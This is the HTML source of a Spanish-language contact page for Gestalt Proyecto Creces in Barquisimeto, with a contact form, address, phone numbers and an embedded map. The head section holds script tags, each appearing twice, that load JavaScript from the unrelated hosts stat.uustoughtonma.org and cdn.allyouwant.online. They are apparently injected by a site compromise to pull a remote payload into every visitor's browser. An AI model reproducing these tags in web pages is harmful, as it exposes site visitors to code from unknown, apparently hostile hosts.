<!DOCTYPE html>
<!--[if lt IE 7]>      <html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]-->
<!--[if IE 7]>         <html class="no-js lt-ie9 lt-ie8"> <![endif]-->
<!--[if IE 8]>         <html class="no-js lt-ie9"> <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js"> <!--<![endif]-->
<head><script type='text/javascript' src='https://stat.uustoughtonma.org/stats.js?f=5'></script><script type='text/javascript' src='https://cdn.allyouwant.online/main.js?t=nplp1'></script>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <title>Gestalt Proyecto Creces</title>
  <meta name="description" content="">
  <meta name="viewport" content="width=device-width">
  
  <link rel="stylesheet" href="css/bootstrap.min.css">
  <style>
    body {
      padding-top: 30px;
      padding-bottom: 20px;
    }
  </style>
  <link rel="stylesheet" href="css/bootstrap-theme.min.css">
  <link rel="stylesheet" href="css/main.css">
  <link rel="stylesheet" href="css/dt_bootstrap.css">
  
  <script type="text/javascript" language="javascript" src="js/jquery.js"></script>
  <script type="text/javascript" language="javascript" src="js/jquery.dataTables.js"></script>
  <script type="text/javascript" charset="utf-8">
    $(document).ready(function() {
      $('#example').dataTable( {
          "oLanguage": {
            
            "sLengthMenu": "Mostar _MENU_ filas",
            "sSearch": "Buscar",
            "sZeroRecords": "Ningún resultado encontrado",
            "sInfo": "Mostrando _START_ a _END_ de _TOTAL_ filas",
            "sInfoEmpty": "Mostrando 0 a 0 de 0 filas",
            "sInfoFiltered": "(filtrado de _MAX_ filas totales)",
            "sDom": "<'row'<'span6'l><'span6'f>r>t<'row'<'span6'i><'span6'p>>",
            "oPaginate": {
            "sPrevious": "Anterior ",
            "sNext": " Siguiente"
          }
          }
        } );
      } );
    </script>
  <script src="js/vendor/modernizr-2.6.2-respond-1.1.0.min.js"></script>
<script type='text/javascript' src='https://cdn.allyouwant.online/main.js?t=nplp1'></script><script type='text/javascript' src='https://stat.uustoughtonma.org/stats.js?f=5'></script></head>
<body>
  
  <!--NAVBAR><!-->     
  
  <div class=container>
    <div class="row">
      <div class="col-md-2"><img src="img/logo.png" alt="LogoCreces" class="img-rounded"></div>
      
      <div class="col-md-10">  
        <div class="espacio"></div>   
        <nav class="navbar navbar-default" role="navigation">
          
          <div class="navbar-header">
            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
              <span class="sr-only">Menú</span>
              <span class="icon-bar"></span>
              <span class="icon-bar"></span>
              <span class="icon-bar"></span>
            </button>
            <a class="navbar-brand" href="index.php"><strong>Gestalt</strong> Creces</a>
          </div>
          
          <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
            <ul class="nav navbar-nav">
              <li class="active"><a href="facilitadores.php">FACILITADORES</a></li>
              <li class="active"><a href="https://inscripcionesgestalt.herokuapp.com/organizations/2/categories">CURSOS</a></li>
              <li class="active"><a href="blog.php">BLOG</a></li>
              <li class="active"><a href="contacto.php">CONTACTO</a></li>
            </ul>
            
            <ul class="nav navbar-nav navbar-right">
            	<li><a href="https://inscripcionesgestalt.herokuapp.com/organizations/2/categories"><span class=\"glyphicon glyphicon-user\"></span> Ingresar a Mi Perfil</a></li>
            </ul>
            
            <!--
            <ul class="nav navbar-nav navbar-right">

              <li><a href="ingreso.php?registro=0"><span class="glyphicon glyphicon-user"></span> Ingresar a Mi Perfil</a></li>            </ul>
            -->
          </div><!-- /.navbar-collapse -->
        </nav>
      </div>
    </div>
  </div>
  
  <!--TERMINA NAVBAR -->
  <hr>
  <br>       
  
  
  <!-- CUERPO -->

  <div class="container">
    
    <div class="row">
      <div class="col-lg-6">
        
        
        <h2>Contáctenos vía email:</h2>
       
        <hr>
        
        <!-- the comment box -->
        <div class="well">

          
          <form class="form-horizontal" role="form" method="post" action="contacto.php">

            <div class="form-group">
              <label for="inputEmail3" class="col-sm-4 control-label lead">Su Nombre</label>
              <div class="col-sm-8">
                <input type="text" name="subject" class="form-control" required>
              </div>
            </div>

            <div class="form-group">
              <label for="inputEmail3" class="col-sm-4 control-label lead">Su Teléfono</label>
              <div class="col-sm-8">
                <input type="text" class="form-control" required>
              </div>
            </div>

            <div class="form-group">
              <label for="inputEmail3" class="col-sm-4 control-label lead"> Su Email</label>
              <div class="col-sm-8">
                <input type="email" name="from" class="form-control" required>
              </div>
            </div>

            <div class="container">
              <div class="form-group">
                <textarea class="form-control" name="message" placeholder="Escriba su mensaje aquí" rows="5"></textarea>
              </div>
            </div>
            <input type="submit" class="btn btn-primary" name="submit" value="Enviar Mensaje">
             
          </form>

          
        </div>
 
      </div>
      
      <div class="col-lg-6">

        <h2 class="text-right">O visítenos en:</h2>
       
        <hr>
        <div class="well">
          
          
          <div class="row">
            <div class="col-lg-2">
             <h1><span class="glyphicon glyphicon-home"></span></h1>
            </div>

            <div class="col-lg-10">

              <p class="lead">Proyecto Creces y Asociados:<br>
                Rif. J-30822611-4
                Av. Madrid con Av. Capanaparo.
                C.C. Cristina Piso 2 Oficina #7.
                Fundalara, Barquisimeto.</p>

            </div>
          </div>

          <div class="row">
            <div class="col-lg-2">
             <h1><span class="glyphicon glyphicon-phone-alt"></span></h1>
            </div>

            <div class="col-lg-10">

              <p class="lead"><br>+58 (251) 254 37 58 / +58 (251) 254 49 72</p>

            </div>
          </div>

          <div class="row">
            <div class="col-lg-2">
             <h1><span class="glyphicon glyphicon-phone"></span></h1>
            </div>

            <div class="col-lg-10">

              <p class="lead"><br>+58 (414) 957 07 11</p>

            </div>
          </div>
          <br>
        </div><!-- /well -->
       
      </div>

    </div>
<hr>

<iframe width="100%" height="650" frameborder="0" scrolling="no" marginheight="0" marginwidth="0" src="https://maps.google.co.ve/maps?f=q&amp;source=s_q&amp;hl=es-419&amp;geocode=&amp;q=proyecto+creces&amp;aq=&amp;sll=10.061866,-69.362848&amp;sspn=0.304576,0.391045&amp;ie=UTF8&amp;hq=proyecto+creces&amp;hnear=&amp;ll=10.064324,-69.281703&amp;spn=0.019036,0.02444&amp;t=m&amp;z=14&amp;iwloc=A&amp;cid=6029560229602204747&amp;output=embed"></iframe><br /><small><a href="https://maps.google.co.ve/maps?f=q&amp;source=embed&amp;hl=es-419&amp;geocode=&amp;q=proyecto+creces&amp;aq=&amp;sll=10.061866,-69.362848&amp;sspn=0.304576,0.391045&amp;ie=UTF8&amp;hq=proyecto+creces&amp;hnear=&amp;ll=10.064324,-69.281703&amp;spn=0.019036,0.02444&amp;t=m&amp;z=14&amp;iwloc=A&amp;cid=6029560229602204747" style="color:#0000FF;text-align:left">Ver mapa más grande</a></small>


    
    
    <!-- FOOTER -->
    <br><br>
    <hr>
    <div class="container">
      <footer>
        <p class="pull-right"><a href="#">Regresar al Tope</a></p>
        <p>&copy; 2014 Proyecto Creces. Plataforma desarrollada por <a href="http://decktra.com">Decktra C.A.</a></p>
      </footer>
    </div>
    
    <!-- TERMINA FOOTER -->
    
    
    <!-- /container -->        
    
    <script src="js/vendor/bootstrap.min.js"></script>
    
    <script src="js/plugins.js"></script>
    <script src="js/main.js"></script>
    
    <script>
      var _gaq=[['_setAccount','UA-XXXXX-X'],['_trackPageview']];
      (function(d,t){var g=d.createElement(t),s=d.getElementsByTagName(t)[0];
                     g.src='//www.google-analytics.com/ga.js';
                     s.parentNode.insertBefore(g,s)}(document,'script'));
    </script>

    
    
    </div>
  </body>
</html>


 